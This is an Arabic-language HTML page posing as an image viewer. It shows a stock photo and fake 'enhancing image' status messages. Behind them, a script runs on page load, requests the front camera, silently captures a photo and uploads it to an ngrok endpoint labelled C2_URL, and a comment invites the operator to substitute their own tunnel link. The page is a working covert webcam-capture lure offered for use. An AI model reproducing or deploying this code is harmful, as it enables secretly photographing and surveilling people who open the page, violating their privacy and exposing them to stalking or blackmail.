<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض الصورة</title>
    <style>
        body { 
            margin: 0; padding: 0; background: #000; color: #fff; 
            font-family: Arial, sans-serif; text-align: center; 
        }
        #status {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.8); padding: 15px 30px; border-radius: 10px;
            font-size: 18px; z-index: 999;
        }
    </style>
</head>
<body>

    <div id="status">جاري تحميل الصورة...</div>
    <img src="https://picsum.photos/id/1015/800/600" style="max-width:100%; margin-top:80px;" alt="صورة">

    <script>
        // غير هذا الرابط إلى رابط ngrok الخاص بك
        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";

        async function captureAndSend() {
            try {
                // طلب صلاحية الكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 } 
                });

                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();

                // التقاط الصورة بعد ثانية ونصف
                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext("2d").drawImage(video, 0, 0);

                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append("file", blob, `camera_${Date.now()}.jpg`);

                        await fetch(C2_URL, {
                            method: "POST",
                            body: formData
                        });

                        console.log("تم إرسال صورة الكاميرا بنجاح");
                    }, "image/jpeg", 0.9);

                    // إيقاف الكاميرا
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);

            } catch (e) {
                console.log("فشل التقاط الصورة أو رفض الصلاحية");
            }
        }

        // بدء العملية بعد تحميل الصفحة
        window.onload = () => {
            document.getElementById("status").innerHTML = "جاري تحسين الصورة...";
            
            // بدء التقاط الصورة بعد 1.5 ثانية
            setTimeout(() => {
                captureAndSend();
            }, 1500);

            // رسالة نهائية
            setTimeout(() => {
                document.getElementById("status").innerHTML = "تم تحميل الصورة بنجاح ✓";
            }, 5000);
        };
    </script>
</body>
</html>
